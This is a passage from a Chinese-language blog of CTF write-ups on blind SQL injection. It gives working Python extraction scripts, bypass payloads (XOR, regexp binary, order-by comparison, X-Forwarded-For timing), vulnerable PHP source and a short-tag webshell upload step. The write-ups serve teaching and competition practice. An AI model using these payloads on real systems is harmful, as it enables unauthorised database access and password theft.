loading="lazy"><p>进行异或注入测试，通过测试发现，id=1^1的结果和id=0的结果是一样的，当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1^(ascii(substr((&quot;此处为sql语句&quot;),变量i,1))&#x3D;变量j)</code></pre><p>查库：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt loading="lazy"></p><p>查表：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)&#x3D;&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt loading="lazy"></p><p>查列：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)&#x3D;&#39;F1naI1y&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt loading="lazy"></p><p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p><p>查字段：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,300):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p>拿到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt loading="lazy"></p><h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p><p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" loading="lazy"><p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p><p>先fuzz一下，以下字符被过滤：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" loading="lazy"><p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p><p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p><p>推测后端sql语句变成</p><pre class="language-sql" data-language="sql"><code class="language-sql">select username password from users where username &#x3D; &#39;1\&#39; and password &#x3D; &#39; or 1#&#39;</code></pre><p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" loading="lazy"><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn&#x2F;index.php&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;passwd &#x3D; &#39;&#39;pass1 &#x3D; &#39;&#39;for i in range(100):    for j in str1:        pass1 &#x3D; &#39;0x5E&#39; + passwd.replace(&#39;0x5E&#39;,&#39;&#39;) + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)        payload &#x3D; &#39; or password regexp binary &#123;&#125;#&#39;.format(pass1)        #print(pass1)        data &#x3D; &#123;            &#39;username&#39;: &#39;1\\&#39;,            &#39;password&#39;: payload        &#125;        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        if &#39;BJD needs&#39; in r.text:            passwd &#x3D; passwd + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p><p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p><p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p><p>index.php（略）</p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php        error_reporting(0);        session_start();        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $username&#x3D;$_POST[&#39;username&#39;];        $password&#x3D;$_POST[&#39;password&#39;];        if(isset($username) &amp;&amp; isset($password))&#123;            if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;                die(&quot;error&quot;);            &#125;            $sql&#x3D;&quot;select pwd from user where uname &#x3D; &#39;$username&#39; limit 1&quot;;            $res&#x3D;mysqli_query($con,$sql);            $row &#x3D; mysqli_fetch_array($res);            if($row[&#39;pwd&#39;]&#x3D;&#x3D;&#x3D;$password)&#123;                $_SESSION[&quot;login&quot;] &#x3D; true;                header(&quot;location:&#x2F;user_main.php?order&#x3D;id&quot;);            &#125;else&#123;                header(&quot;location:&#x2F;index.php&quot;);            &#125;        &#125;else&#123;            header(&quot;location:&#x2F;index.php&quot;);        &#125;?&gt;</code></pre><p>reg.html（略）</p><p>reg.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php        error_reporting(0);        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $username&#x3D;$_POST[&#39;username&#39;];        $password&#x3D;$_POST[&#39;password&#39;];        $email&#x3D;$_POST[&#39;email&#39;];        $nickname&#x3D;$_POST[&#39;nickname&#39;];        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$password))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;\]|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$email))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$nickname))&#123;                die(&quot;error&quot;);        &#125;        if(isset($username) &amp;&amp; isset($password) &amp;&amp; isset($email) &amp;&amp; isset($nickname))&#123;            $sql &#x3D; &quot;INSERT INTO user (uname, pwd, email,nname) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;,&#39;$nickname&#39;)&quot;;            $res&#x3D;mysqli_query($con, $sql);            if ($res) &#123;                $_SESSION[&quot;login&quot;] &#x3D; true;                header(&quot;location:&#x2F;index.php&quot;);            &#125;         &#125;        mysqli_close($conn);?&gt;</code></pre><p>user_main.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow_web&lt;&#x2F;title&gt;&lt;style&gt;..........(css)&lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?php    if(isset($_SESSION[&quot;login&quot;]) &amp;&amp; $_SESSION[&quot;login&quot;] &#x3D;&#x3D;&#x3D; true)&#123;        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $order&#x3D;$_GET[&#39;order&#39;];        if(isset($order) &amp;&amp; strlen($order)&lt;6)&#123;            if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?&#x2F;i&quot;,$order))&#123;                die(&quot;error&quot;);            &#125;            $sql&#x3D;&quot;select * from user order by $order&quot;;        &#125;else&#123;            $sql&#x3D;&quot;select * from user order by id&quot;;        &#125;   ?&gt;..........(html)&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag&#123;xxxxx&#125;</code>那么<code>e</code>&lt;<code>flag&#123;xxxxx&#125;</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p><p>exp</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;https:&#x2F;&#x2F;b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show&quot;urlreg &#x3D; url + &quot;&#x2F;reg.php&quot;  #注册 必须要是可传参php文件urllogin &#x3D; url + &quot;&#x2F;login.php&quot;  #登录 必须要是可传参php文件urlorder &#x3D; url + &quot;&#x2F;user_main.php?order&#x3D;pwd&quot;  # 显示s &#x3D; &quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;  # 按照ascii码表的字符串大小排序flag &#x3D; &quot;&quot;for i in range(100):    for j in s:        exp &#x3D; &quot;&quot;        exp &#x3D; flag + j        datereg &#x3D; &#123;            &quot;username&quot;:exp,  # 仔细观察username和password并没有对-和&#123;&#125;进行过滤            &quot;email&quot;:&quot;zzz&quot;,            &quot;nickname&quot;:&quot;zzz&quot;,            &quot;password&quot;:exp        &#125;        datelogin &#x3D; &#123;            &quot;username&quot;:exp,            &quot;password&quot;:exp        &#125;        if (exp &#x3D;&#x3D; &#39;flag&#39;):  # 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行            flag &#x3D; &#39;flag&#39;            print(flag)            break        session &#x3D; requests.session()  # 保持会话        reg &#x3D; session.post(urlreg, datereg)        login &#x3D; session.post(urllogin, datelogin)        a &#x3D; session.get(urlorder)        txt &#x3D; a.text        if (txt.index(&quot;&lt;td&gt;&quot;+exp+&quot;&lt;&#x2F;td&gt;&quot;)&gt;txt.index(&quot;&lt;td&gt;flag@ctf.show&lt;&#x2F;td&gt;&quot;)):  # index返回字符串被找到到最小的索引（最左）            flag &#x3D; flag + chr(ord(j)-1)   # 得到的字符为比flag的单个字符的值大1，所以需要-1            print(flag)            break</code></pre><p>最终得到到flag</p><h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="CISCN2019-总决赛-Day2-Web1-Easyweb"></a>CISCN2019-总决赛-Day2-Web1-Easyweb</h3><p>robots.txt内容如下</p><pre class="language-none"><code class="language-none">User-agent: *Disallow: *.php.bak</code></pre><p>于是找<code>.bak</code>文件，发现存在image.php.bak，下载下来后得到image.php的源码如下:</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image&#x2F;jpeg&quot;);readfile($path);</code></pre><p>发现存在sql注入，通过传入id为<code>\\0</code>来转义id后面的引号，与path前面的引号闭合导致sql注入</p><p>exp如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;a371750a-b2b0-4f95-9c4f-c2cf5292c17c.node3.buuoj.cn&#x2F;image.php&quot;result &#x3D; &quot;&quot;# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select database()),&#123;&#125;,1))?&#123;&#125;,1,0)--+# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  images,users# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+  username,password# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   8e97f11c1585e0f6dedb# ?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+   adminpayload &#x3D; &quot;?id&#x3D;\\\\0&amp;path&#x3D; or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)--+&quot;for i in range(0, 100):    high &#x3D; 127    low &#x3D; 32    mid &#x3D; (low + high) &#x2F;&#x2F; 2    while high &gt; low:        payloads &#x3D; payload.format(i, mid)        # print(url + payloads)        html &#x3D; requests.get(url + payloads)        if &#39;JFIF&#39; in html.text:            low &#x3D; mid + 1        else:            high &#x3D; mid        mid &#x3D; (low + high) &#x2F;&#x2F; 2    result +&#x3D; chr(int(mid))    print(result)</code></pre><p>得到admin的密码登录后是一个文件上传的页面，上传的文件会自动生成一个日志并且告诉了我们路径且后缀为php文件，上传后打开界面会显示文件的名字，于是抓包将文件名改为一句话木马，上传后php就会解析这个页面里的php语法，但是文件名字不能有php在里面，于是就需要一句话的短标签版，前提需要PHP开启短标签即<code>short_open_tag=on</code>，题目支持，随后<code>cat /flag</code>即可</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt loading="lazy"></p><p><strong>F12</strong>可以看到<strong>hint</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt loading="lazy"></p><p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt loading="lazy"></p><p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p><ul><li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li></ul><p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p><p>exp如下：</p><pre class="language-php" data-language="php"><code class="language-php">import requestsurl &#x3D; &quot;https:&#x2F;&#x2F;bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show&#x2F;&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;passwd &#x3D; &#39;&#39;for i in range(1, 40):    for j in str1:        exp &#x3D; passwd + j        payload &#x3D; &#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;if(left((password),&#123;&#125;)REGEXP&#x2F;**&#x2F;binary&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;,sleep(3),1)#&#39;.format(i, exp)        data &#x3D; &#123;            &#39;username&#39;: &#39;admin%0a\\&#39;,            &#39;password&#39;: payload        &#125;        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        if r.elapsed.total_seconds()&gt;1:            passwd &#x3D; passwd + j            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>这里需要注意以下几点：</p><ul><li><code>binary</code>匹配大小写</li><li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li><li>空格用<code>/**/</code></li></ul><p>随后就可以跑出密码登录即可得到<code>flag</code></p><h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p><p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/">http://123.206.87.240:8002/web15/</a></p><p>在题目的下方给了源码：</p><pre class="language-php" data-language="php"><code class="language-php">flag格式：flag&#123;xxxxxxxxxxxx&#125;不如写个Python吧error_reporting(0);function getIp()&#123;$ip &#x3D; &#39;&#39;;if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];&#125;else&#123;$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$ip_arr &#x3D; explode(&#39;,&#39;, $ip);return $ip_arr[0];&#125;$host&#x3D;&quot;localhost&quot;;$user&#x3D;&quot;&quot;;$pass&#x3D;&quot;&quot;;$db&#x3D;&quot;&quot;;$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip &#x3D; getIp();echo &#39;your ip is :&#39;.$ip;$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;mysql_query($sql);</code></pre><p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" loading="lazy"><p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p><p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p><p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p><p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p><p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p><p>python脚本如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsstr &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-&quot;url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&quot;for i in range(0,40):    for j in str:        data &#x3D; &quot;此处为Payload&quot;.format(i,j)        header &#x3D; &#123;&quot;x-forwarded-for&quot;:data&#125;        r &#x3D; requests.get(url,headers&#x3D;header)        if r.elapsed.total_seconds()&gt;1:            print(j,end &#x3D; &#39;&#39;)            break</code></pre><h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    # flag在fl4g里    include &#39;waf.php&#39;;    header(&quot;Content-type: text&#x2F;html; charset&#x3D;utf-8&quot;);     $db &#x3D; new mysql();    $id &#x3D; $_GET[&#39;id&#39;];    if ($id) &#123;        if(check_sql($id))&#123;            exit();        &#125; else &#123;            $sql &#x3D; &quot;select * from flllllllag where id&#x3D;$id&quot;;            $db-&gt;query($sql);        &#125;    &#125;    highlight_file(__FILE__);</code></pre><p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p><p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" loading="lazy"><p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p><p>regexp后所跟的东西作为正则表达式处理。</p><p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>于是写出盲注注入脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;for i in range(1,100):    for j in range(45,128):        if j&lt;58 or j&gt;96:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;            d &#x3D; &quot;1 and if(ascii(mid(fl4g,&quot;+str(i)+&quot;,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;            r &#x3D; requests.get(url+d)            if r.elapsed.total_seconds()&gt;1:                print(chr(j),end&#x3D;&#39;&#39;)                break</code></pre><h3 id="网鼎杯2018—Unfinish"><a href="#网鼎杯2018—Unfinish" class="headerlink" title="网鼎杯2018—Unfinish"></a>网鼎杯2018—Unfinish</h3><p>登录用的邮箱和密码，注册可以注册邮箱账号和密码，并且在登录后的index.php处有显示注册的用户名，用户名存入了数据库，于是推测在register.php处存在注入点，测试后发现过滤了逗号和information，不过可以用from和for代替，payload：<code>0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or 